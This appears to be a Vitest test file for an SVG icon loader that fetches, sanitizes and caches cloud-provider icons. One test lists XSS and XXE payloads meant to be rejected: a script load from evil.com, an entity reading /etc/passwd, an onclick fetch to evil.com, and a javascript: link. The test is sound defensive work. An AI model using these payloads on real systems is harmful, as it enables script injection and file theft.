import { tmpdir } from "node:os";
import { join } from "node:path";
import { awsProvider } from "@archlex/aws";
import { gcpProvider } from "@archlex/gcp";
import { CacheManager, IconLoader, sanitizeSvg } from "@archlex/icons";
import { beforeEach, describe, expect, it, vi } from "vitest";

describe("Dynamic CDN Icon Loading E2E & Security", () => {
  beforeEach(() => {
    // Use unique cache dir per test to avoid cache hits from previous tests
    const uniqueCacheDir = join(
      tmpdir(),
      `archlex-e2e-test-${Date.now()}-${Math.random().toString(36).slice(2)}`,
    );
    process.env.ARCHLEX_ICON_CACHE_DIR = uniqueCacheDir;
    // Reset IconLoader singleton state between tests
    IconLoader.reset();
  });

  it("completes full flow: request icon -> CDN fetch -> sanitize -> cache -> retrieve", async () => {
    const mockSvg =
      '<svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="32" r="30" fill="#FF9900"/></svg>';
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: () => Promise.resolve(mockSvg),
    });

    IconLoader.registerProvider(
      "aws",
      {
        provider: "aws",
        name: "aws-test",
        baseUrl: "https://example.com/icons",
        fileExtension: ".svg",
        attribution: {
          source: "test",
          license: "MIT",
          url: "https://example.com",
        },
      },
      { apprunner: "app-runner" },
      { fetchFn: mockFetch },
    );

    const icon = await IconLoader.get("aws", "apprunner");
    expect(icon).toBeDefined();
    expect(icon?.svgFragment).toContain('fill="#FF9900"');
    expect(mockFetch).toHaveBeenCalledTimes(1);
    expect(mockFetch).toHaveBeenCalledWith(
      "https://example.com/icons/app-runner.svg",
    );

    // Second call should be served from cache without calling fetch
    const cachedIcon = await IconLoader.get("aws", "apprunner");
    expect(cachedIcon?.checksum).toBe(icon?.checksum);
    expect(mockFetch).toHaveBeenCalledTimes(1); // Still only 1 fetch call
  });

  it("prevents XSS, XXE, and active content injection across all providers", () => {
    const vectors = [
      '<svg viewBox="0 0 64 64"><script href="http://evil.com/xss.js"/></svg>',
      '<!ENTITY xxe SYSTEM "file:///etc/passwd"><svg viewBox="0 0 64 64">&xxe;</svg>',
      '<svg viewBox="0 0 64 64" onclick="fetch(\'http://evil.com\')"><rect width="10" height="10"/></svg>',
      '<svg viewBox="0 0 64 64"><a href="javascript:alert(1)"><circle r="5"/></a></svg>',
    ];

    for (const vector of vectors) {
      expect(() => sanitizeSvg("aws", "test", vector)).toThrow();
      expect(() => sanitizeSvg("gcp", "test", vector)).toThrow();
    }
  });

  it("successfully loads AWS provider icons with real provider config", async () => {
    const provider = awsProvider();
    expect(provider.id).toBe("aws");
    expect(provider.supports("lambda")).toBe(true);

    const service = provider.resolveService("lambda");
    expect(service).toBeDefined();
    expect(service?.id).toBe("lambda");
  });

  it("successfully loads GCP provider icons with real provider config", async () => {
    const provider = gcpProvider();
    expect(provider.id).toBe("gcp");
    expect(provider.supports("cloud-functions")).toBe(true);

    const service = provider.resolveService("cloud-functions");
    expect(service).toBeDefined();
    expect(service?.id).toBe("cloud-functions");
  });
});
